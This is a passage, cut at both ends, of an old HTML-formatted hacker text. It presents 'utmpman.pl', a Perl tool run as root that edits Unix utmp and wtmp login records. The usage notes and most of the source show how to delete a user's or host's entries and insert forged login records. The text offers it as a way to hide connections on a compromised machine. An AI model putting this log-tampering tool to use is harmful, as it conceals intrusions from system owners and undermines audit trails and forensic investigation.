<BR>sometimes.&nbsp; This will allow you to see their connection.&nbsp;
You must be root to
<BR>run the script, and they need perl 5.003+ on thier system.&nbsp; After
starting
<BR>the script just type help.

<P>Here are some of the basic commands:

<P>starts by loading wtmp

<P>delete user username
<BR>delete host hostanme
<BR>write

<P>read wtmp
<BR>delete user username
<BR>delete host hostname
<BR>write

<P>do help for the rest ... the best wtmp,wtmp editor around!

<P>Say thankyou i-e ;)

<P>-----------------------start of utmpman.pl
<BR>#!/usr/bin/perl -w
<BR>#
<BR># Variable defines.
<BR>my($utmp_location) = "/var/run/utmp";
<BR>my($wtmp_location) = "/var/log/wtmp";
<BR>my($shells_location) = "/etc/shells";
<BR>my($ttybase) = "tty";
<BR>my($ttyrange) = "pqrs";&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
# TTYrange standard on most linux systems.
<BR>my($ttyports) = "012345657689abcfef";&nbsp;&nbsp; # TTYports standard
on most linux systems.

<P># Global initializations.
<BR>my($active_file) = "";
<BR>my(%entries) = {};
<BR>my(@cmdline) = ();
<BR>my(@shells) = ();

<P># Display banner.
<BR>print "\nutmp Manager v0.8\n\n";

<P># Access check.
<BR>die("utmpman :: You must be root to run this application!\n") unless
($> == 0);

<P># Read in valid shells.
<BR>if (defined($shells_location)) {
<BR>&nbsp; open(SHELLFILE, "&lt;$shells_location");
<BR>&nbsp; @shells = &lt;SHELLFILE>;
<BR>&nbsp; close(SHELLFILE);
<BR>}
<BR># Process "basename" of each shell.
<BR>@shells = map( { /([^\/\n]+)\n*$/; $1; } @shells);
<BR>&nbsp;
<BR>print push(@shells) . " valid shells in $shells_location: @shells\n"
if (defined(@shells));
<BR>readfile("$utmp_location");
<BR>print("\nutmpman: $active_file> ");
<BR>while (&lt;STDIN>) {
<BR>&nbsp; process_cmd(split);
<BR>&nbsp; print("\nutmpman: $active_file> ");
<BR>}

<P>sub process_cmd {
<BR>&nbsp; return if (!defined(@_));
<BR>&nbsp; my(@line) = map { lc($_) } @_;
<BR>&nbsp;
<BR>&nbsp; $_ = shift(@line);
<BR>&nbsp; SWITCH: {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^check$/&nbsp;&nbsp;&nbsp;&nbsp;
&amp;&amp; do {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
check_func(@line);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
last SWITCH;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^delete$/&nbsp;&nbsp;&nbsp;
&amp;&amp; do {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
del_func(@line);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
last SWITCH;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^help$/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&amp;&amp; do {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
help_func();
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
last SWITCH;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^insert$/&nbsp;&nbsp;&nbsp;
&amp;&amp; do {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ins_func(@line);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
last SWITCH;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^list$/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&amp;&amp; do {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
list_func(@line);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
last SWITCH;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^read$/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&amp;&amp; do {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
read_func(@line);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
last SWITCH;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^write$/&nbsp;&nbsp;&nbsp;&nbsp;
&amp;&amp; do {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
write_func(@line);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
last SWITCH;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /^quit|exit$/ &amp;&amp;
exit(0);
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # DEFAULT.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print ("Invalid command.\n");
<BR>&nbsp; }
<BR>}
<BR>&nbsp;

<P># HELP

<P>sub help_func {
<BR>&nbsp; print &lt;&lt; "EOM";

<P>utmpManager Help
<BR>----------------

<P>Note: - &lt;n> is an argument.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - [id=] is a token which expects a value
as part of command
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ie, insert id=p5 user=root
11/23/96). See the insert command.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - A line is the full name to the tty
port, ie ttyp0.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - An id is the *unique* representation
of the port
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (without the tty, etc),
ie "p0" (for ttyp0).

<P>&nbsp; check
<BR>&nbsp;&nbsp;&nbsp; - Perform user consistancy check. Use this to make
sure that the data in
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; utmp agrees with who is actually on
the machine. This is useful in
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; determining if a user is online with
hidden ports, running nohup'd
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; processes, or running iScreen.

<P>&nbsp; delete &lt;x>-&lt;y>
<BR>&nbsp;&nbsp;&nbsp; - Delete entries #x to #y.

<P>&nbsp; delete host &lt;host>
<BR>&nbsp;&nbsp;&nbsp; - Delete *all* entries which match the substring
&lt;host>.

<P>&nbsp; delete line|id &lt;line|id>
<BR>&nbsp;&nbsp;&nbsp; - Delete entry containing &lt;line> or &lt;id>.

<P>&nbsp; insert {id=|line=} [type=] [user=] [host=] [ConnTime] {LogoffTime}
<BR>&nbsp;&nbsp;&nbsp; - Insert an entry into utmp/wtmp files specifying
any combination
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; of id/line, type, username, host, connection
time, and logoff time.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (LogoffTime only valid for WTMP files.)

<P>&nbsp; list host &lt;host>
<BR>&nbsp;&nbsp;&nbsp; - List all entries matching the substring &lt;host>.

<P>&nbsp; list line|id &lt;line|id>
<BR>&nbsp;&nbsp;&nbsp; - List all entries matching &lt;line> or &lt;id>.

<P>&nbsp; read utmp|wtmp|&lt;filename>
<BR>&nbsp;&nbsp;&nbsp; - Read entries from either default wtmp, default
utmp, or an arbitrary
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; filename. Note: arbitrary filenames
MUST start with either "utmp" or
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "wtmp" to be used with this editor.
Rename files *outside* of this
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; editor if necessary. If read is executed
without any arguments, it
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rereads the last given filename, which
is displayed on the prompt.

<P>&nbsp; write {filename}
<BR>&nbsp;&nbsp;&nbsp; - Write entries to file {filename}. If write is
executed without any
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; arguments, then entries will be written
to the last given filename,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; which is displayed on the prompt.

<P>EOM
<BR>}

<P># DELETE

<P>sub del_func {
<BR>&nbsp; my(@params) = @_;

<P>&nbsp; if (!push(@_)) {
<BR>&nbsp;&nbsp;&nbsp; print("delete :: Not enough parameters. See \"help\"
for syntax.\n");
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; } elsif ($params[0] =~ /host|user|id|line/) {
<BR>&nbsp;&nbsp;&nbsp; del_by_data(@_);
<BR>&nbsp; } elsif ($params[0] =~ m/\d*-\d+|\d+-\d*/) {
<BR>&nbsp;&nbsp;&nbsp; del_by_range($params[0]);
<BR>&nbsp; } elsif ($params[0] =~ m/^(\d+)$/) {
<BR>&nbsp;&nbsp;&nbsp; del_by_range("$1-$1");
<BR>&nbsp; }
<BR>&nbsp;
<BR>&nbsp; # Renumber list after delete operation.
<BR>&nbsp; resync();
<BR>}
<BR>&nbsp;

<P>sub del_by_range {
<BR>&nbsp; my($range)=shift;
<BR>&nbsp; $range =~ m/(\d+)*-(\d+)*/;
<BR>&nbsp; my($lo, $hi, $count)=($1, $2, 0);
<BR>&nbsp;
<BR>&nbsp; $lo = 0 if (!defined($lo));
<BR>&nbsp; $hi = scalar(keys(%entries)) if (!defined($hi));
<BR>&nbsp;
<BR>&nbsp; foreach (sort( { $a &lt;=> $b } keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; if (($_ >= $lo) &amp;&amp; ($_ &lt;= $hi)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; delete($entries{$_});
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $count++;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp; print "$count entries deleted.\n";
<BR>}
<BR>&nbsp;

<P>sub del_by_data {
<BR>&nbsp; my($op, $data) = @_;
<BR>&nbsp; my($count) = 0;

<P>&nbsp; if ((length($data) &lt; 5) &amp;&amp; ($op eq "host")) {
<BR>&nbsp;&nbsp;&nbsp; print "Must specify at least 5 characters for delete
hostmask.\n";
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; } elsif (((length($data) > 4) &amp;&amp; ($op eq "id"))||
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ((length($data)
> 11) &amp;&amp; ($op eq "line"))) {
<BR>&nbsp;&nbsp;&nbsp; print "Invalid $op specified.\n";
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }
<BR>&nbsp; # Note: If we are deleting by user, then user must match, *exactly*!
<BR>&nbsp; $data = "^" . pack("a8", $data) . "\$" if ($op eq "user");
<BR>&nbsp; foreach (sort( { $a &lt;=> $b } keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; if (%{$entries{$_}}->{$op} =~ m/$data/i) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; delete($entries{$_});
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ++$count;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp; if (!$count) {
<BR>&nbsp;&nbsp;&nbsp; print "No $op entries matching $data.\n";
<BR>&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp; print "$count entries deleted.\n";
<BR>&nbsp; }
<BR>}
<BR>&nbsp;

<P># INSERT

<P># Date1 Time1 = DateTime1 => mm/dd/[cc]yy[:hh:mm[:ss]]
<BR># Date2 Time2 = DateTime2 => (see above)
<BR># user=&lt;username>
<BR># host=&lt;hostname>
<BR># id=&lt;id> | line=&lt;line>
<BR>#
<BR># utmp:
<BR># insert {id=|line=} [type=] [user=] [host=] [DateTime]
<BR># wtmp:
<BR># insert {id=|line=} [user=] [host=] [DateTime1] {DateTime2}

<P>sub ins_func {
<BR>&nbsp; my(%cmdopt)={};
<BR>&nbsp; my($datetime1, $datetime2, $gmdate, $gmdate2);

<P>&nbsp; # Get random pid out of the way.
<BR>&nbsp; $cmdopt{"pid"} = int(rand(32656)+100);
<BR>&nbsp; $cmdopt{"addr"} = pack("a4", "");

<P>&nbsp; # Get command options.
<BR>&nbsp; foreach (@_) {
<BR>&nbsp;&nbsp;&nbsp; if (/=/) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; local($key, $value)=split(/=/);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $cmdopt{$key} = $value;
<BR>&nbsp;&nbsp;&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!defined($datetime1)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $datetime1 = $_;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!defined($datetime2)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $datetime2 = $_ ;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "insert :: Invalid options specified.
Please see \"help\" for syntax.\n";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }

<P>&nbsp; # Check for an illegal pair or illegal option.
<BR>&nbsp; foreach (keys(%cmdopt)) {
<BR>&nbsp;&nbsp;&nbsp; if (!(/^host|id|line|type|user|addr$/)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "insert :: Invalid options specified.
Please see \"help\" for syntax.\n";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp; if (($_ eq "last") &amp;&amp; ($active_file !~&nbsp;
m!/*utmp[^/]*$!i)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "insert :: LAST option only valid
for utmp files.\n";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }

<P>&nbsp; # Get date in seconds since 1970.
<BR>&nbsp; $gmdate = SecsSince1970($datetime1);

<P>&nbsp; # Get ending date in seconds since 1970.
<BR>&nbsp; $gmdate2 = SecsSince1970($datetime2) if (defined($datetime2));

<P>&nbsp; if (!defined($gmdate) || (!defined($gmdate2) &amp;&amp; defined($datetime2)))
{
<BR>&nbsp;&nbsp;&nbsp; print "insert :: Invalid date specified.\n";
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }

<P>&nbsp; if (defined($gmdate2)) {
<BR>&nbsp;&nbsp;&nbsp; if ($gmdate2 &lt; $gmdate) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "insert :: First date/time must
be *later* than second date/time.\n";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; }

<P>&nbsp; if (defined($cmdopt{"id"}) &amp;&amp; defined($cmdopt{"line"}))
{
<BR>&nbsp;&nbsp;&nbsp; print "insert :: Insert by LINE or ID only. Please
do not specify both.\n";
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }

<P>&nbsp; my($op);

<P>&nbsp; if (!defined($cmdopt{"id"})) {
<BR>&nbsp;&nbsp;&nbsp; $cmdopt{"id"} = $cmdopt{"line"};
<BR>&nbsp;&nbsp;&nbsp; $op = "line";
<BR>&nbsp;&nbsp;&nbsp; if (!($cmdopt{"id"} =~ s/^$ttybase//)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print "insert :: Invalid line specified.\n";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp; $cmdopt{"line"} = $ttybase . $cmdopt{"id"};
<BR>&nbsp;&nbsp;&nbsp; $op = "id";
<BR>&nbsp; }

<P>&nbsp; if (!(defined($cmdopt{"line"}) || defined($cmdopt{"id"}))) {
<BR>&nbsp;&nbsp;&nbsp; print "insert :: Neither LINE nor ID value found.
See \"help\" for syntax.\n";
<BR>&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp; }
<BR>&nbsp;
<BR>&nbsp; my($searchdata) = ($active_file =~ m!/*utmp[^/]*$!i) ?
<BR>&nbsp;&nbsp;&nbsp; (pack(($op eq "line") ? "a12" : "a4", $cmdopt{$op})):$cmdopt{$op};
<BR>&nbsp; my($epos1, $npos1, $epos2, $npos2) = ();
<BR>&nbsp; my($oldpos, $count)=("", 0);

<P>&nbsp; foreach (sort( { $a &lt;=> $b } keys(%entries))) {
<BR>&nbsp;&nbsp;&nbsp; if ($active_file =~ m!/*utmp[^/]*$!i) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Handle utmp insertion by line insertion.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (%{$entries{$_}}->{$op} eq $searchdata)
{
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("insert :: $op $searchdata
already exists at position $_\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # This needs to check every
option in %cmdopt for defined or null.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $count = 0;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (qw(user host time))
{
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (defined($cmdopt{$_}))
{
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$count++ if ($cmdopt{$_} ne "");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!$count) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("insert
:: No other data specified. Entry unchanged.\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return undef;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Handle wtmp insertion by time position.
(Messy)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $epos1 = $oldpos if (defined($npos1)
&amp;&amp; !defined($epos1));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $npos1 = $_ if (%{$entries{$_}}->{"time"}
> $gmdate);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last if (!defined($gmdate2) &amp;&amp;
defined($epos1));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $epos2 = $oldpos if (defined($npos2));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $npos2 = $_ if (%{$entries{$_}}->{"time"}
> $gmtime2);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last if (defined($epos2));
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp; $oldpos = $_;
<BR>&nbsp; }

<P>&nbsp; # Set any unspecified defaults.
<BR>&nbsp; $cmdopt{"user"} = pack("a8", "")&nbsp; if !defined($cmdopt{"user"});
<BR>&nbsp; $cmdopt{"host"} = pack("a16", "") if !defined($cmdopt{"host"});
<BR>&nbsp; $cmdopt{"type"} = 7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if !defined($cmdopt{"type"});

<P>&nbsp; # Determine end of list insertion positions. (IE, dates entered
are after
<BR>&nbsp; # dates in wtmp file or line/id not found in utmp file.
<BR>&nbsp; $epos1 = (scalar(keys(%entries)) + 1) if (!defined($npos1));
<BR>&nbsp; if (defined($datetime2)) {
<BR>&nbsp;&nbsp;&nbsp; $epos2 = (scalar(keys(%entries)) + 1) if (!defined($npos2));
<BR>&nbsp;&nbsp;&nbsp; ++$epos2 if (defined($gmtime2) &amp;&amp; !defined($npos1));
<BR>&nbsp; }

<P>&nbsp; # Parse insert data and insert entry.
<BR>&nbsp; $epos1 = sprintf("%7.3f", ($npos1 - $epos1)/2) if (defined($npos1));
<BR>&nbsp; $epos2 = sprintf("%7.3f", ($npos2 - $epos2)/2)
<BR>&nbsp;&nbsp;&nbsp; if (defined($npos2) &amp;&amp; defined($gmdate2));

<P>&nbsp; # Insert first entry.
<BR>&nbsp; $cmdopt{"time"} = $gmdate;
<BR>&nbsp; @{$entries{$epos1}}{qw(type pid line id time user host addr)}
=
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @{%cmdopt}{qw(type
pid line id time user host addr)};

<P>&nbsp; if (defined($epos2)) {
<BR>&nbsp;&nbsp;&nbsp; $cmdopt{"user"} = pack("a8", "");
<BR>&nbsp;&nbsp;&nbsp; $cmdopt{"host"} = pack("a16","");
<BR>&nbsp;&nbsp;&nbsp; $cmdopt{"id"}&nbsp;&nbsp; = pack("a4", "");
<BR>&nbsp;&nbsp;&nbsp; $cmdopt{"time"} = $gmdate2;
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp; @{$entries{$epos2}}{qw(type pid line id time user
host addr)} =
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
@{%cmdopt}{qw(type pid line id time user host addr)};
<BR>&nbsp; }

<P>&nbsp; resync();
<BR>}
<BR>&nbsp;

<P># LIST

<P>sub list_func {
<BR>&nbsp; my(@params) = @_;

<P>&nbsp; if (!push(@_) || ($params[0] eq "all")) {
<BR>&nbsp;&nbsp;&nbsp; list_by_range("-");
<BR>&nbsp;&nbsp;&nbsp; return 0;
<BR>&nbsp; } elsif ($params[0] =~ /^host|user|id|line$/) {
<BR>&nbsp;&nbsp;&nbsp; list_by_data(@_);
<BR>&nbsp;&nbsp;&nbsp; return 0;
<BR>&nbsp; } elsif ($params[0] =~ m/\d*-\d+|\d+-\d*/) {
<BR>&nbsp;&nbsp;&nbsp; list_by_range($params[0]);
<BR>&nbsp;&nbsp;&nbsp; return 0;
<BR>&nbsp; } elsif ($params[0] =~ m/^(\d+)$/) {
<BR>&nbsp;&nbsp;&nbsp; list_by_range("$1-$1");
<BR>&nbsp;&nbsp;&nbsp; return 0;
<BR>&nbsp; }
<BR>&nbsp;
<BR>&nbsp; print ("list :: Error in parameters. See \"help\" for syntax.\n");
<BR>&nbsp; return undef;
<BR>}
<BR>&nbsp;

<P>sub list_by_data {
<BR>&nbsp; my($op, $data) = @_;
<BR>&nbsp; my($count) = 0;

